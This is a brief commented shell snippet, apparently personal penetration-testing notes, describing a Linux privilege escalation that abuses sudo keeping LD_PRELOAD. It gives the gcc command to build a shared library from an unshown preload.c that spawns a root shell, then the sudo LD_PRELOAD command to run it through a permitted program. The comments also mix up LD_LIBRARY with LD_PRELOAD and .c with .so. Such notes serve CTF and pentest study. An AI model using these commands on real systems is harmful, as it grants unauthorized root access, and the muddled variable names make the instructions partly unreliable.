# Exploiting persisted LD_LIBRARY and LD_LIBRARY_PATH environment variables, with sudo permissions
# If 'sudo -l' shows that LD_LIBRARY persists through the sudo environment
# and there are commands that can be run as sudo, try this exploit

# First compile the preload.c file as a shared library and store in /tmp/ as /tmp/preload.so
# This is going to create a library to be run before everything else (LD_LIBRARY=/tmp/preload.c)
    gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c

# The compiled shared library contains a shell script that spawns a root bash shell
# The next step is to run sudo, specify the compiled .so file as the library to run first and then
# use one of the programs that the user is allowed to run as root, in order for everything to take place
# within an elevated privilege environment
    sudo LD_PRELOAD=/tmp/preload.so <program>

